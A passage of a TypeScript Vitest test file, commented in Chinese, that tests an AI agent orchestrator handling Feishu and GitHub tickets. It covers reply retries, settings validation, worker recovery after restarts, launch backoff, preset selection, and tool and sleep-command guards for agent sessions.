  const queue = (id: string, address: Record<string, string>) => { runtime.outbox.send({ id, channel: { ...channel, address }, text: '已合并。', kind: 'notice' }) }
  queue('gone-reply', channel.address)
  queue('failing-reply', { ...channel.address, messageId: 'om_8' })
  vi.mocked(Commands.prototype.lark).mockImplementation(async args => {
    const replying = args.join(' ')
    if (replying.includes('om_7')) throw new CliError('the message was withdrawn', 230011)
    if (replying.includes('om_9')) return {}
    // 指明撤回的文本并非飞书关于会话已消失的答复。
    throw new Error('Request failed: withdrawn tokens are not recalled messages')
  })
  await runtime.sendReplies()
  // 飞书渠道将撤回代码视为已消失；其他任何失败都会保留回复以供重试。
  expect(runtime.store.replyStatus('gone-reply')).toBe('dropped')
  expect(runtime.store.replyStatus('failing-reply')).toBe('pending')
  const settings = runtime.store.settings(), feishuSource = settings.sources.feishu!
  runtime.store.saveSettings({ ...settings, sources: { ...settings.sources, feishu: { ...feishuSource, enabled: false } } })
  queue('off-reply', { ...channel.address, messageId: 'om_9' })
  queue('ignored-reply', { chatId: 'oc_elsewhere', messageId: 'om_10' })
  await runtime.sendReplies()
  expect([runtime.store.replyStatus('off-reply'), runtime.store.replyStatus('ignored-reply')]).toEqual(['pending', 'pending'])
  // 来源再次开启后，等待的消息会在 5 秒后重试时发出或被丢弃。
  runtime.store.saveSettings(settings)
  vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + 5000 })
  try { await runtime.sendReplies() } finally { vi.useRealTimers() }
  expect([runtime.store.replyStatus('off-reply'), runtime.store.replyStatus('ignored-reply')]).toEqual(['sent', 'dropped'])
  const dropped = ((await api('GET', 'sources')).body as unknown as { dropped: { id: string }[] }[]).flatMap(source => source.dropped)
  expect(dropped).toMatchObject([{ id: 'ignored-reply', dropped: { reason: 'channelIgnored' } }, { id: 'gone-reply', dropped: { reason: 'channelGone' } }])
})

it('reports a dropped acknowledgement as dropped, with its Ticket on the Source status and in the last day\'s flow', async () => {
  const { sessionId, ticket } = await acceptedTicket()
  const followup = feishu('10', '还有这个', { mentions: [], root_id: 'om_1' })
  await receive(followup)
  vi.mocked(Commands.prototype.lark).mockRejectedValue(new CliError('the message was withdrawn', 230011))
  expect(await runTool(sessionId, 'orchestrator_ack', { trigger_id: followup.id, text: '收到，也处理这个。' })).toMatchObject({ acknowledgement: 'dropped' })
  expect(await runTool(runtime.masterId, 'orchestrator_read', { resource: `trigger/${followup.id}` })).toMatchObject({ acknowledgement: 'dropped' })
  const dropped = ((await api('GET', 'sources')).body as unknown as { dropped: unknown[] }[]).flatMap(source => source.dropped)
  expect(dropped).toMatchObject([{ id: key('ack', followup.id), ticket: { id: ticket.id, title: ticket.title } }])
  expect(overviewOf(runtime).flow.dropped).toBe(1)
})

it('refuses a settings save with an unknown model or a Source kind that is not installed, an oversized prompt, an unknown revision and a malformed path with 4xx', async () => {
  const request = async (method: string, path: string, body?: unknown) => {
    let status = 0, text = ''
    const chunks = body === undefined ? [] : [Buffer.from(JSON.stringify(body))]
    const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  vi.mocked(services.llm as { resolveCallConfig: ReturnType<typeof vi.fn> }).resolveCallConfig.mockRejectedValueOnce(new Error('unknown provider nowhere'))
  const evalBlock = { ...runtime.store.settings().eval, model: { provider: 'nowhere', model: 'x' } }
  expect(await request('PUT', 'settings/eval', { value: evalBlock, revision: runtime.store.blockRevision('eval') }))
    .toMatchObject({ status: 400, body: { code: 'modelUnavailable', values: { block: 'eval', error: 'unknown provider nowhere' } } })
  const stored = runtime.store.settings()
  runtime.store.saveSettings({ ...stored, sources: { ...stored.sources, slack: { kind: 'slack', enabled: false, config: {} } } })
  expect(await request('PUT', 'settings/source:slack', { value: { enabled: true, config: {} }, revision: 0 }))
    .toMatchObject({ status: 400, body: { code: 'sourceNotInstalled', values: { source: 'slack' } } })
  const huge = { ...runtime.prompts.current().config, delivery: 'x'.repeat(runtime.machine.promptMaxChars.get()) }
  expect(await request('POST', 'prompts/preview', huge)).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  expect(await request('PUT', 'prompts', { config: huge, baseRevision: runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  // 对当前版本没有的部件的覆盖会被拒绝，而不是缺失。
  expect(await request('PUT', 'prompts', { config: { ...runtime.prompts.current().config, overrides: { 'runtime/nothing': { text: 'x' } } },
    baseRevision: runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'unknownPromptPart' } })
  expect(await request('GET', 'prompts?revision=99')).toMatchObject({ status: 404, body: { code: 'unknownPromptRevision' } })
  expect(await request('GET', 'threads/%E0%A4%A')).toEqual({ status: 400, body: { error: 'A path segment has a malformed escape' } })
})

it('records a report, the PR it binds and its relay together, or none of them', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  deliveries.mockClear()
  const before = runtime.store.tickets.get(ticket.id)!
  // 引擎拒绝的报告不会绑定任何 PR，尽管 PR 本身可以被绑定。
  await expect(runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'done', pr_number: 42, human_action: 'Ship it?' })).rejects.toThrow()
  // 拉取请求规则拒绝的 PR 不会记录任何报告。
  vi.mocked(Commands.prototype.gh).mockImplementation(async args => args[1]?.includes('/pulls/')
    ? { state: 'open', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/7', head: { ref: 'feature/other', sha: 'h', repo: { full_name: 'acme/widgets' } } }
    : { default_branch: 'master', permissions: { push: true } })
  await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 7, human_action: 'Desktop too?' })).rejects.toThrow()
  const after = runtime.store.tickets.get(ticket.id)!
  expect(after).not.toHaveProperty('follows')
  expect(after).not.toHaveProperty('attention')
  expect(after.assignments).toEqual(before.assignments)
  await runtime.idle()
  expect(relays(runtime.masterId)).toEqual([])
})

it('tells the main Session of each requeue of the same Trigger', async () => {
  const stranger = commentTrigger('github', { id: 4, body: 'still wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-4', created_at: '2026-09-09T00:00:00Z' },
    { number: 8, isPr: true, url: 'https://github.com/acme/widgets/pull/8' }, 'conversation', 'agent-bot')
  await receive(stranger)
  const requeued = () => agents.get(runtime.masterId)!.inject.mock.calls.filter(([message]) => JSON.stringify(message).includes('trigger_requeued')).length
  expect(runtime.engine.reevaluate(stranger.id)).toBe(true)
  await runtime.idle()
  expect(runtime.engine.reevaluate(stranger.id)).toBe(true)
  await runtime.idle()
  expect(requeued()).toBe(2)
})

it('keeps replies and acknowledgements to an IM conversation within the IM limit', async () => {
  const { ticket, trigger, sessionId } = await acceptedTicket()
  const long = Array.from({ length: IM_WORDS + 1 }, () => 'word').join(' ')
  await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'reviewed' })
  await expect(runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: long })).rejects.toThrow(`maximum is ${IM_WORDS}`)
  const follow = feishu('3', '还有一个问题', { mentions: [], root_id: trigger.meta.messageId as string, sender_id: MEMBER })
  await receive(follow)
  await expect(runTool(sessionId, 'orchestrator_ack', { trigger_id: follow.id, text: long })).rejects.toThrow(`at most ${IM_WORDS} words`)
})

it('refuses a second process on the same state directory before it opens the database, so it migrates nothing', () => {
  // 运行中的构建会以 schema 10 读取的数据库保持原样。
  const db = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='10' WHERE key='schema'").run()
  db.close()
  const ctx = new Context()
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  expect(() => new Runtime(ctx, testMachine({ stateDir: directory }), vi.fn())).toThrow(/already being held/)
  expect(runtime.store.get(KV.store.schema)).toBe(10)
  runtime.store.set(KV.store.schema, SCHEMA_VERSION)
})

it('applies a changed prompt size limit to the next save and request without a restart', async () => {
  const limit = reference(100000)
  const next = await restart({ promptMaxChars: limit })
  await next.ready
  const put = async (config: unknown) => {
    let status = 0, text = ''
    const chunks = [Buffer.from(JSON.stringify({ config, baseRevision: next.prompts.current().revision }))]
    const req = { method: 'PUT', url: '/orchestrator/api/prompts', headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  const config = next.prompts.current().config
  const size = JSON.stringify(config).length
  expect(await put({ ...config, delivery: 'x'.repeat(size) })).toMatchObject({ status: 200 })
  // 加载器会就地提交更低的上限；下一次保存会读取它。
  limit.set(size + 1000)
  expect(await put({ ...config, delivery: `${config.delivery}${'y'.repeat(2000)}` }))
    .toMatchObject({ status: 400, body: { code: 'promptTooLong', values: { limit: String(size + 1000) } } })
  // 请求体上限也一样，每个字符四字节再加余量。
  const bytes = 4 * (size + 1000) + 4096
  expect(await put({ ...config, delivery: 'z'.repeat(bytes) })).toMatchObject({ status: 400, body: { error: `Request exceeds ${bytes} bytes` } })
  expect(restarts).not.toHaveBeenCalled()
})

it('releases the database and the state directory lock when it fails to start, so it can start again in this process', async () => {
  await runtime.stop()
  const db = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='99' WHERE key='schema'").run()
  db.close()
  const context = () => { const ctx = new Context(); for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service); return ctx }
  expect(() => new Runtime(context(), testMachine({ stateDir: directory }), vi.fn())).toThrow('Unsupported orchestrator database version 99')
  const fixed = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  fixed.prepare('UPDATE kv SET value=? WHERE key=?').run(String(SCHEMA_VERSION), 'schema')
  fixed.close()
  // 失败启动保留下来的锁会让这里抛出锁已被持有。
  runtime = new Runtime(context(), testMachine({ stateDir: directory }), vi.fn())
  await runtime.ready
  expect(runtime.store.get(KV.store.schema)).toBe(SCHEMA_VERSION)
})

it('tells the conversation that the PR merged when work a restart recovered ends with it later', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42 })
  // 宿主在 worker 工作中途重启：其派工会带着恢复说明重新开始。
  const before = runtime.store.tickets.get(ticket.id)!
  runtime.engine.assignmentInterrupted(ticket.id, runningAssignment(before)!.id)
  await runtime.idle()
  expect(runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(2)
  // PR 在重启前已合并；恢复的工作继续，但暂不说明任何内容。
  const merged = { number: 42, state: 'closed', merged: true, merged_at: before.assignments[0]!.createdAt, html_url: 'https://github.com/acme/widgets/pull/42',
    user: { login: 'agent-bot' }, head: { sha: 'abc', ref: 'agent/x', repo: { full_name: 'acme/widgets' } } }
  await observePull(runtime.context(githubKind, 'github'), merged)
  expect(runtime.store.tickets.get(ticket.id)).not.toHaveProperty('ended')
  const id = key('pr-terminal', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged')
  expect(runtime.store.replyStatus(id)).toBeUndefined()
  // 其就绪报告会随 PR 结束工单，而会话会得知合并一次。
  await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'Recovered and verified' })
  expect(runtime.store.tickets.get(ticket.id)!.ended).toMatchObject({ outcome: 'merged' })
  expect(runtime.store.replyStatus(id)).toBeDefined()
  // 结束工单的报告是 worker 自己的：其回合不会在该工具调用内被取消。
  expect(agents.get(sessionId)!.cancel).not.toHaveBeenCalled()
})

it('restarts a worker that was mid-work when the host stopped with the recovery note, and records no end of its turn', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'halfway' })
  // 停止会取消 worker 的回合：它进入空闲并将中止作为错误报告，而正在停止的宿主会将其视为没有结束。
  const agent = agents.get(sessionId)! as { status: string; cancel: ReturnType<typeof vi.fn> }
  const stopping = (runtime as unknown as { ctx: Context }).ctx
  agent.cancel.mockImplementation(() => {
    agent.status = 'idle'
    stopping.emit('agent/status', { agent, status: 'idle' } as never)
    stopping.emit('agent/error', { agent, turn: 1, step: 1, error: Object.assign(new Error('The operation was aborted'), { name: 'AbortError' }) } as never)
  })
  const next = await restart()
  await next.ready
  const recovered = next.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', expect.stringMatching(/^(pending|running)$/)])
  expect(recovered.assignments[0]!.report).toMatchObject({ state: 'progress', summary: 'halfway' })
  expect(recovered.assignments.flatMap(item => item.report ? [item.report.state] : [])).toEqual(['progress'])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
})

it('keeps the report of a blocked, failed or ready worker whose turn ends, and relays nothing more', async () => {
  for (const state of ['blocked', 'failed', 'ready'] as const) {
    const { ticket, sessionId } = await acceptedTicket(feishu(String(20 + ['blocked', 'failed', 'ready'].indexOf(state)), `@bot 修 ${state}`, { root_id: undefined }))
    await runTool(sessionId, 'orchestrator_report', { state, summary: `${state} report` })
    const relayed = relays(runtime.masterId).length
    const agent = agents.get(sessionId)! as { status: string }
    agent.status = 'idle'
    ;(runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
    await runtime.idle()
    expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state, summary: `${state} report` })
    expect(relays(runtime.masterId)).toHaveLength(relayed)
  }
})

it('relays the status-request hint when a worker\'s turn ends with no text and no report', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const agent = agents.get(sessionId)! as { status: string }
  agent.status = 'idle'
  ;(runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
  await vi.waitFor(() => expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'waiting' }))
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', ticket: { ticket_id: ticket.id }, state: 'waiting',
    summary: expect.stringContaining('orchestrator_ticket_request_status') })
})

it('fails a ticket at once on a worker error that is not passing, and relays it', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  ;(runtime as unknown as { ctx: Context }).ctx.emit('agent/error', { agent: agents.get(sessionId), turn: 1, step: 1, error: new Error('Invalid tool schema') } as never)
  await vi.waitFor(() => expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('Invalid tool schema') }))
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', ticket: { ticket_id: ticket.id }, state: 'failed' })
})

it('runs one polling loop per source record and ends them all on shutdown', async () => {
  const started: string[] = []
  const adapter = { kind: githubKind, async watch(_host: unknown, id: string, signal: AbortSignal) {
    started.push(id)
    await new Promise<void>(resolve => signal.aborted ? resolve() : signal.addEventListener('abort', () => resolve()))
  } } as SourceAdapter
  const current = runtime.store.settings()
  runtime.store.saveSettings({ ...current, sources: {
    'github-a': { kind: 'github', enabled: true, config: { repository: 'acme/one' } },
    'github-b': { kind: 'github', enabled: true, config: { repository: 'acme/two' } },
  } })
  runtime.startSources([adapter])
  await vi.waitFor(() => expect([...started].sort()).toEqual(['github-a', 'github-b']))
  await runtime.stop()
})

it('refuses the main Session a bash command that runs sleep and a long job wait, as reports arrive by themselves, and no worker', async () => {
  const bash = (command: string) => ({ name: 'bash', arguments: { command, description: 'x' } })
  const main = guards.get(runtime.masterId)!
  for (const command of ['sleep 60; echo done', 'cd x && sleep 5', 'gh pr checks 7 || sleep 30', 'echo a\nsleep 90', 'while true; do sleep 30; done',
    '(sleep 5)', '/bin/sleep 240', 'while sleep 30; do gh pr checks 7; done', 'if sleep 5; then gh pr view 7; fi', '{ sleep 60; }', '! sleep 5',
    'nohup sleep 60', 'exec sleep 60', 'time sleep 60', 'until sleep 1; do :; done', 'command sleep 5', 'env sleep 5'])
    expect(main(bash(command)), command).toMatch(/^Reports, follow_up notices, new candidates and a background job's end/)
  // 将 sleep 作为数据而非命令位置点名的命令会运行。
  for (const command of ['gh api repos/acme/widgets/pulls', 'echo "sleep"', 'grep sleep file', 'sleeper --help', 'command -v sleep'])
    expect(main(bash(command)), command).toBeUndefined()
  // 无论以何种等待方式、在何种预设下，要求将步骤保持超过 30 秒的命令。
  const timed = (command: string, args: { timeoutMs?: number; run_in_background?: boolean } = {}) =>
    ({ name: 'bash', arguments: { command, description: 'x', ...args } })
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 120_000 }))).toMatch(/^Reports/)
  expect(main(timed("python3 -c 'import time;time.sleep(240)'", { timeoutMs: 600_000 }))).toMatch(/^Reports/)
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 20_000 }))).toBeUndefined()
  // 在 router 预设下，shell 会在 5 秒后将没有超时的命令移到后台任务，而没有超时的任务
  // 等待也会在 5 秒后结束；更长的任务等待不会等待以这种方式到达的任何内容。
  expect(main(timed('gh pr checks 7 --watch'))).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true } })).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 30_000 } })).toMatch(/^Reports/)
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 5_000 } })).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j' } })).toBeUndefined()
  // 之前创建的主会话按 standard 运行，其 shell 默认等待 60 秒，任务等待最多 30 秒：
  // 没有超时的命令会在后台运行或点名超时，而任务等待会点名超时。
  ;(agents.get(runtime.masterId) as unknown as { session: { header: { agentPreset: string } } }).session.header = { agentPreset: 'standard' }
  expect(main(timed('gh pr checks 7 --watch'))).toMatch(/^This shell waits up to 60 seconds by default: pass timeoutMs of at most 30000/)
  expect(main(timed('gh pr checks 7 --watch', { run_in_background: true }))).toBeUndefined()
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 20_000 }))).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true } })).toMatch(/^Reports/)
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 5_000 } })).toBeUndefined()
  // worker 会在需要时等待自己的工作。
  const { sessionId } = await acceptedTicket()
  expect(guards.get(sessionId)!(bash('sleep 60'))).toBeUndefined()
  // 主会话的角色说明了这一点。
  expect(masterPrompt).toContain('worker 报告、follow_up 通知、新候选以及后台任务的结束及其输出会作为消息自行到达')
})

it('reads the main Session\'s preset from a registry with or without presetForSession, and takes standard\'s caps when it cannot', async () => {
  const watch = { name: 'bash', arguments: { command: 'gh pr checks 7 --watch', description: 'x' } }
  const route = { name: 'orchestrator_route', arguments: { decisions: [] } }
  const guard = async (registry: Record<string, unknown>, projections?: Record<string, unknown>) => {
    services.agentPresets = registry
    if (projections) services.sessionProjections = projections; else delete services.sessionProjections
    await (await restart()).ready
    return guards.get(runtime.masterId)!
  }
  // 已释放的 DSH 注册表没有 presetForSession：投影会说明 standard，因此适用 standard 的上限，
  // 其他工具也能运行。
  let main = await guard({ select: vi.fn() }, { stateOf: vi.fn((_session: unknown, key: string) => key === 'agentPreset' ? 'standard' : undefined) })
  expect(main(route)).toBeUndefined()
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
  // 连投影也没有时，以创建它时所用的预设为准：router 预设。
  main = await guard({ select: vi.fn() })
  expect([main(route), main(watch)]).toEqual([undefined, undefined])
  // 尽管会话是以 router 预设创建的，注册表仍说明 standard：适用 standard 的上限。
  main = await guard({ select: vi.fn(), presetForSession: () => 'standard' })
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
  // 出错的注册表会被读取为 standard，即更安全的上限，而守卫不会抛出。
  main = await guard({ select: vi.fn(), presetForSession: () => { throw new Error('no projection') } })
  expect(main(route)).toBeUndefined()
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
})

it('refuses an ended ticket\'s worker its tools, and restricts the main Session to the tools it may use', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  expect(guards.get(sessionId)!()).toBeUndefined()
  runtime.engine.stopTicket(ticket.id)
  expect(guards.get(sessionId)!()).toBe('Ticket ended; new work needs a new authorized ticket')
  expect(restricts.get(runtime.masterId)).toEqual([{ allow: ['skill', 'bash', 'read', 'read_image', 'job_output', 'job_list', 'job_kill'] }])
  // worker 只保留配置文件中的工作工具：没有要求人、更改配置文件、在 worker 槽位之外安排或启动工作、
  // 访问其他会话或编辑文档的工具，无论它们何时注册。
  expect(restricts.get(sessionId)).toEqual([{ allow: ['read', 'read_image', 'grep', 'bash', 'job_output', 'job_list', 'job_kill', 'web_search', 'skill'] }])
})

it('gives an explicit ticket\'s worker a prompt without the limits of an inferred Mandate', async () => {
  const { sessionId } = await acceptedTicket()
  await runtime.idle()
  expect(sections.get(sessionId)!.text({})).not.toContain(mandateInstructions({ strength: 'inferred' }))
})

it('runs a launch that fails for a passing reason again on the launch backoff three times, then fails its ticket; a failed prepare fails at once', async () => {
  const original = controller.resolveAgent.getMockImplementation()! as (id: string) => Promise<unknown>
  const later = async (now: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now })
    try { await runtime.pump(); await runtime.idle() } finally { vi.useRealTimers() }
  }
  for (const [index, error] of [Object.assign(new Error('Service Unavailable'), { status: 503 }), Object.assign(new Error('read ECONNRESET'), { code: 'ECONNRESET' })].entries()) {
    let tries = 0
    controller.resolveAgent.mockImplementation(async (id: string) => {
      if (String(id).startsWith('worker-')) { tries++; throw error }
      return original(id)
    })
    const { ticket } = await acceptedTicket(feishu(String(30 + index), `@bot 修 ${index}`, { root_id: undefined }))
    await runtime.idle()
    let now = Date.now()
    for (let attempt = 0; attempt < 3; attempt++) {
      expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toBeUndefined()
      now += 5000 * 2 ** attempt + 1000
      await later(now)
    }
    expect(tries).toBe(4)
    expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
    controller.resolveAgent.mockImplementation(original)
  }
  // 输出点名通过类失败结果的 prepare 命令不会自行再次运行。
  const runs = () => subprocess.spawn.mock.calls.filter(([spec]) => (spec as { argv: string[] }).argv[0] === shellArgv('')[0]).length
  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: 'exit 3' } })
  answers[shellArgv('exit 3').join(' ')] = new Error('fatal: unable to access: The requested URL returned error: 503')
  const before = runs()
  const prepared = await acceptedTicket(feishu('40', '@bot 修 prepare', { root_id: undefined }))
  await runtime.idle()
  expect(runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('503') })
  expect(runs()).toBe(before + 1)
  // 重试会再次运行 prepare 命令，因为它留下的空目录已被删除；恢复不会重新启动失败的启动。
  delete answers[shellArgv('exit 3').join(' ')]
  runtime.executor.resume()
  await runtime.idle()
  expect(runs()).toBe(before + 1)
  runtime.engine.retryTicket(prepared.ticket.id)
  await runtime.idle()
  expect(runs()).toBe(before + 2)
  expect(runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
})

it('launches a queued Assignment once when the host resumes, and gives a failed launch\'s slot back', async () => {
  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, maxWorkers: 1, prepare: 'exit 3' } })
  answers[shellArgv('exit 3').join(' ')] = new Error('fatal: no such clone')
  const failed = await acceptedTicket(feishu('50', '@bot 修 一', { root_id: undefined }))
  await runtime.idle()
  expect(runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
  // 失败的启动不占用槽位：下一个工单会在唯一的槽位中启动。
  delete answers[shellArgv('exit 3').join(' ')]
  const next = await acceptedTicket(feishu('51', '@bot 修 二', { root_id: undefined }))
  await runtime.idle()
  expect(runtime.store.tickets.get(next.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
  // 第三个会等待槽位；恢复会再次排队其启动，一旦槽位空闲就会运行。
  const queued = await acceptedTicket(feishu('52', '@bot 修 三', { root_id: undefined }))
  await runtime.idle()
  expect(runtime.store.tickets.get(queued.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'pending' })
  runtime.executor.resume(); runtime.executor.resume()
  const launches = () => deliveries.mock.calls.filter(([call]) => call.sessionId === queued.sessionId).length
  ;(agents.get(next.sessionId)! as { status: string }).status = 'idle'
  await runtime.pump(); await runtime.idle()
  await vi.waitFor(() => expect(runtime.store.tickets.get(queued.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' }))
  expect(launches()).toBe(1)
})

it('shows the settings history when one revision holds values its Source kind no longer accepts, without that revision\'s changes', async () => {
  const settings = runtime.store.settings()
  await runtime.settings.save('executor', { ...settings.executor, maxWorkers: 4 }, runtime.store.blockRevision('executor'), 'panel')
  await runtime.settings.save('executor', { ...runtime.store.settings().executor, maxWorkers: 5 }, runtime.store.blockRevision('executor'), 'panel')
  // 迁移留下一个按早期版本写入的修订版本，飞书类型的 schema 会拒绝它。
  const revision = runtime.store.get(KV.settings.revision)!
  const stored = runtime.store.get(KV.settings.version(revision - 1))!
  runtime.store.set(KV.settings.version(revision - 1), { ...stored, settings: { ...stored.settings,
    sources: { ...stored.settings.sources, feishu: { kind: 'feishu', enabled: true, config: { readPageSize: 'many' } } } } })
  const history = policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings()))
  expect(history.items.slice(0, 2)).toEqual([expect.objectContaining({ revision, changes: null }), expect.objectContaining({ revision: revision - 1, changes: null })])
  expect(history.items[2]).toMatchObject({ revision: revision - 2 })
})

it('restarts a worker whose shell job the host stop ended with the recovery note, as a worker mid-work', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'running the tests' })
  // 其回合以后台测试运行结束，因此它忙碌，而不是等待。
  jobs.run(sessionId)
  const agent = agents.get(sessionId)! as { status: string }
  agent.status = 'idle'
  ;(runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
  await runtime.idle()
  expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'progress' })
  // 宿主停止，其任务也随之结束。
  jobs = jobRegistry(); services.jobs = jobs.service
  const next = await restart()
  await next.ready
  const recovered = next.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', expect.stringMatching(/^(pending|running)$/)])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
})

it('creates an Executor Session under the bundle\'s worker preset, and the main Session under its router preset', async () => {
  const { sessionId } = await acceptedTicket()
  const created = controller.create.mock.calls.map(([options]) => options as { sessionId: string; agentPreset: string })
  expect(created.find(options => options.sessionId === sessionId)).toMatchObject({ agentPreset: 'dsh-superagent-worker' })
  expect(created.find(options => options.sessionId === runtime.masterId)).toMatchObject({ agentPreset: 'dsh-superagent-router' })
})

it('selects its own preset again for a main Session or worker a person switched before its first turn, and not after it', async () => {
  const { sessionId } = await acceptedTicket()
  // DSH 的预设注册表，仅在会话首个回合之前接受选择。
  const started = new Set<string>()
  const presets = { select: vi.fn(async (agent: { id: string }, preset: string) => {
    if (started.has(agent.id)) throw Object.assign(new Error('This session has already started'), { code: 'agent-preset/locked' })
    return preset
  }) }
  services.agentPresets = presets
  await (await restart()).ready
  const emit = (sessionId: string, preset: string) => (runtime as unknown as { ctx: Context }).ctx.emit('agent-preset/selected', sessionId, preset)
  // 有人在 DSH 的 Web UI 中打开了空白主会话，从而为其选择了默认预设。
  emit(runtime.masterId, 'standard')
  await vi.waitFor(() => expect(presets.select).toHaveBeenCalledWith(agents.get(runtime.masterId), 'dsh-superagent-router'))
  // 它自己的预设也以同样方式由该选择宣告，保持不动。
  presets.select.mockClear()
  emit(runtime.masterId, 'dsh-superagent-router'); await Promise.resolve()
  expect(presets.select).not.toHaveBeenCalled()
  emit(sessionId, 'standard')
  await vi.waitFor(() => expect(presets.select).toHaveBeenCalledWith(agents.get(sessionId), 'dsh-superagent-worker'))
  // 另一个会话不属于 dsh-superagent。
  presets.select.mockClear()
  emit('someone-else', 'standard'); emit('worker-nothing', 'standard'); await Promise.resolve()
  expect(presets.select).not.toHaveBeenCalled()
  // 首个回合之后，注册表会拒绝任何选择，这不会改变任何内容，也不是错误。
  started.add(runtime.masterId)
  emit(runtime.masterId, 'standard')
  await vi.waitFor(() => expect(presets.select).toHaveBeenCalledTimes(1))
  await expect(presets.select.mock.results[0]!.value).rejects.toMatchObject({ code: 'agent-preset/locked' })
})

it('gives a subagent of a worker only the worker\'s work tools, and none once the ticket ended', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  // DSH 会在 standard 预设下创建子代理，并以 worker 的会话作为其父级。
  await (controller.create as (options: { sessionId: string }) => Promise<void>)({ sessionId: 'child-1' })
  const child = agents.get('child-1')! as unknown as { session: { header: { parentSession?: string } } }
  child.session.header = { parentSession: sessionId }
  await (runtime as unknown as { ctx: Context }).ctx.parallel('agent/created', { agent: child } as never)
  expect(restricts.get('child-1')).toEqual([{ allow: ['read', 'read_image', 'grep', 'bash', 'job_output', 'job_list', 'job_kill', 'web_search', 'skill'] }])
  expect(guards.get('child-1')!()).toBeUndefined()
  runtime.engine.stopTicket(ticket.id)
